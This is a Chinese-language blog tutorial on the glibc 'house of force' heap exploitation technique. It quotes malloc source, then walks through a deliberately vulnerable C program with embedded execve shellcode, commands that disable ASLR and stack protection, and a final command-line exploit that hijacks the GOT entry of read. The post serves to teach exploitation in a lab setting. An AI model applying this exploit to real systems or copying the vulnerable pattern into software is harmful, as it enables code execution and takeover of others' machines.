---
title: house of force
date: 2016-10-15 12:30:46
tags: 
- heap
- exploit
categories:
- heap_exploit
author: wolfzhang
---

趁着最近把博客搭起来了，把堆的利用方式 “house of *” 系列记录一下。
因为house of force较简单，比较容易满足利用条件，所以先记录一下此利用方式。

## 利用条件

1. 能覆盖top chunk的chunk header。
2. 可调用多次malloc(n)，n可以控制。

## 利用详解

house of force的核心是覆盖av->top的size字段，然后malloc(n)，重写av->top的值, 进而让malloc返回的指针可控。这样就可以达到任意地址写了。
我们来看一下glic中的相关代码。
<!-- more -->

```c

static void* _int_malloc(mstate av, size_t bytes)

{

  INTERNAL_SIZE_T nb;             /* normalized request size */

  mchunkptr       victim;         /* inspected/selected chunk */

  INTERNAL_SIZE_T size;           /* its size */

  mchunkptr       remainder;      /* remainder from a split */

  unsigned long   remainder_size; /* its size */

  checked_request2size(bytes, nb);

  [...]

  victim = av->top;

  size = chunksize(victim);

  if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE))

  {

    remainder_size = size - nb;

    remainder = chunk_at_offset(victim, nb);

    av->top = remainder;

    set_head(victim, nb | PREV_INUSE | (av!=&main_arena ? NON_MAIN_ARENA : 0));

    set_head(remainder, remainder_size | PREV_INUSE);


    check_malloced_chunk(av, victim, nb);

    void *p = chunk2mem(victim);

    if (__builtin_expect (perturb_byte, 0))
      alloc_perturb (p, bytes);

    return p;
  }

  [...]
}
```
如果要满足if条件继续执行下面的代码，我们可以把top chunk的size字段覆盖为FFFFFFFF，这样无论如何都会执行这部分代码。
然后下面会执行chunk_at_offset(victim, nb):
```c
/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
```
这里的nb需要转化，并不是malloc(size)的size，需要经过以下转化：
```c
#define checked_request2size(req, sz)                             \
  if (REQUEST_OUT_OF_RANGE (req)) {                               \
      __set_errno (ENOMEM);                                       \
      return 0;                                                   \
    }                                                             \
  (sz) = request2size (req);

#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
```
然后我们在malloc时通过精心构造一个数值，改写av->top的值为got表的地址（其实是got_addr-8)，然后再malloc时返回的指针就是got表的地址了。最后如果有read，strcpy之类的函数就可以把got表地址改为shellcode的地址。

## 利用举例

这里拿个例子详细说明下：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

char shellcode[25] = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80";

int main(int argc, char *argv[])
{
    printf("shellcode_addr = %p\n", shellcode);
    char *buf1, *buf2, *buf3;

    if (argc != 4) 
    {
        exit(0);
    }

    buf1 = malloc(256);
    printf("buf1_addr = %p\n", buf1);
    printf("top_chunk_addr = %p\n", buf1 + 256);
    strcpy(buf1, argv[1]);
    getchar();

    printf("allocated 0x%08x bytes for buf2\n", strtoul(argv[2], NULL, 16));
    buf2 = malloc(strtoul(argv[2], NULL, 16));
    getchar();

    printf("buf2_addr = %p\n", buf2);
    buf3 = malloc(256);
    printf("buf3_addr = %p\n", buf3);
    strcpy(buf3, argv[3]);   
    
    getchar();
    read(0, buf3, 10);
    return 0;
}
```
为了方便我们把栈保护，DEP和ALSR关了。
相关操作为：gcc -fno-stack-protector -z execstack -o force house-of-force.c，echo 0 > /proc/sys/kernel/randomize_va_space。

首先覆盖top chunk的size字段，可以输入"a"*260+\xff\xff\xff\xff"，如果最后有调用free函数要注意了，因为可能会出现double free or corruption （out）的情况，解决方案是你要控制好第二个参数的值。
接下来就是重写av->top的值了，read@got的值为0x08049988，旧的top值为0x804a108，所以第二次malloc时经过转化后的nb的值为：read@got - 8 - top = fffff878. malloc的用户请求大小应该再减去8(大多数情况是减8，除去pre_size和size字段)
。最后再malloc一次返回的指针就是read@got的值了。然后跳转到shellcode处就可以了。

最终的exploit：
```shell
./force `python -c 'print "a"*260+"\xff\xff\xff\xff"'` fffff870 `python -c 'print "\xb0\x99\x04\x08"'`
```
执行结果如下：
<img src="http://of38fq57s.bkt.clouddn.com/house-of-force.PNG">

## 相关参考

相关习题：[bcloud](http://w0lfzhang.me/2017/03/18/2016-BCTF-bcloud/)

参考链接：[X86 EXPLOITATION 101: “HOUSE OF FORCE” – JEDI OVERFLOW](https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/)


